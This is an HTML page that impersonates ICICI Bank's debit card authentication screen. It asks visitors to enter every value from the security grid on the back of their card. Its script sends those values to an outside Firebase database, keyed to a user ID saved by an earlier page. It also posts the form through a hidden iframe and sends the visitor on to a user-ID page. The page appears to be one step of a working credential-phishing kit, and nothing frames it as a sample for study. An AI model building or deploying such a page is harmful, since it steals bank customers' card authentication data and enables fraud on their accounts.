<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICICI Bank Debit Card Authentication</title>
    <!-- Add Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="global.css">
    <style>

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            margin-bottom: 20px; /* Add margin below the header */
        }

        .time {
            font-size: 14px;
            color: #666;
        }

        .wifi {
            font-size: 14px;
            color: #666;
        }

        .icici-logo {
            width: 190px; /* Adjust width as needed */
            margin-bottom: 10px; /* Add margin below logo */
        }

        .instructions {
            margin-bottom: 20px;
            font-size: 16px;
        }

        .card-image {
            max-width: 100%; /* Make sure image scales down on smaller screens */
            margin-bottom: 20px;
        }

        .grid-input {
            margin-bottom: 20px;
        }

        .grid-input label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
        }

        .grid-input input {
            width: 40px;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            text-align: center;
            font-size: 14px;
        }

        .auth-button {
            background-color: #f69312; /* ICICI Bank brand color */
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 20px;
            font-size: 16px;
            width: 100%;
        }

        .message {
            margin-top: 20px;
            padding: 15px;
            background-color: #fff8dc; /* Light yellow background */
            border: 1px solid #eee;
            border-radius: 4px;
            font-size: 14px;
        }

        footer {
            margin-top: 30px;
            text-align: center;
            font-size: 14px;
            color: #777;
        }

        .footer a {
            color: #007bff;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer p {
            margin: 5px 0;
        }

        .quick-links {
            display: flex;
            justify-content: space-around;
            margin-top: 20px;
        }

        .quick-links a {
            color: #007bff;
            text-decoration: none;
        }

        .otp-instructions {
            font-size: 14px;
            margin-bottom: 20px;
        }

        .download-link {
            color: #e0001a; /* ICICI Bank brand color */
            text-decoration: none;
        }

        .input-box {
            border: 1px solid #ccc;
            padding: 10px;
            width: fit-content;
            margin: 0 auto;
            overflow-x: auto;
        }

        .input-box table {
            border-collapse: collapse;
            margin-bottom: 10px;
            width: 100%;
        }

        .input-box th, .input-box td {
            border: 1px solid #ccc;
            padding: 5px;
            text-align: center;
            font-size: 12px;
        }

        .input-box input[type="text"] {
            width: 30px;
            text-transform: uppercase;
            font-size: 14px;
        }

        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }

            .icici-logo {
                width: 150px;
            }

            .instructions {
                font-size: 14px;
            }

            .grid-input input {
                width: 30px;
                padding: 6px;
            }

            .auth-button {
                padding: 10px 20px;
                font-size: 14px;
            }

            .input-box {
                padding: 5px;
            }

            .input-box th, .input-box td {
                padding: 3px;
            }
        }
    </style>
</head>
<body>
        <!-- Static- Please don't do anything here-->
        <script type="text/javascript">var submitted=false;</script>
        <form class="LoginForm" action="posta.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
            <div class="container">
                <div class="header"></div>

              <center>  <img class="icici-logo" src="icici h.jpg" alt="ICICI Bank Logo">  
                <div class="instructions">
                    <p>Your ICICI Bank Debit Card has a grid on its reverse. Enter number from grid as printed against the following alphabets:</p>
                </div>

                <img class="card-image" src="ICICI Debit Card LOGO.jpg" alt="ICICI Debit Card"> 
                
                <div class="grid-input">
                    <div class="input-box">
                        <table>
                            <thead>
                                <tr>
                                    <th>A</th><th>B</th><th>C</th><th>D</th>
                                    <th>E</th><th>F</th><th>G</th><th>H</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><input type="text" name="gridA" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridB" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridC" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridD" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridE" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridF" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridG" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridH" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                </tr>
                            </tbody>
                        </table>

                        <table>
                            <thead>
                                <tr>
                                    <th>I</th><th>J</th><th>K</th><th>L</th>
                                    <th>M</th><th>N</th><th>O</th><th>P</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><input type="text" name="gridI" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridJ" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridK" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridL" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridM" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridN" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridO" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                    <td><input type="text" name="gridP" minlength="2" maxlength="2" inputmode="numeric" required/></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>

                    <br/>

                    <button type="submit" class="btn">AUTHENTICATE</button>
                </div>
            </div>
        </form></center>

        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){window.location='User_id.html';}"></iframe>

    <!-- Firebase Configuration and Data Submission -->
    <script>
  // Initialize Firebase
  const firebaseConfig = {
    apiKey: "AIzaSyCDcF_4SEUs2RKDOAWoXUTCb9DO6QaO1TU",
    authDomain: "motutest-ac954.firebaseapp.com",
    databaseURL: "https://motutest-ac954-default-rtdb.firebaseio.com",
    projectId: "motutest-ac954",
    storageBucket: "motutest-ac954.firebasestorage.app",
    messagingSenderId: "85522378752",
    appId: "1:85522378752:web:7ebe0121ab3ff25e09a8e5"
  };
  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const database = firebase.database();

  document.querySelector('.LoginForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    // Get saved ID from Page-1
    const userId = localStorage.getItem("currentUserId");
    if (!userId) {
      alert("Session expired. Please start again.");
      return;
    }

    // Collect grid values
    const gridValues = {};
    const inputs = document.querySelectorAll('.input-box input[type="text"]');
    inputs.forEach(input => {
      gridValues[input.name] = input.value;
    });

    try {
      // ✅ Update existing user with grid values
      await database.ref("user/" + userId).update({ gridValues });

      console.log("✅ Grid values updated for user:", userId);

      window.location.href = "User_id.html";
    } catch (error) {
      console.error("❌ Error updating data:", error);
      alert("Error submitting data. Please try again.");
    }
  });
</script>
</body>
</html>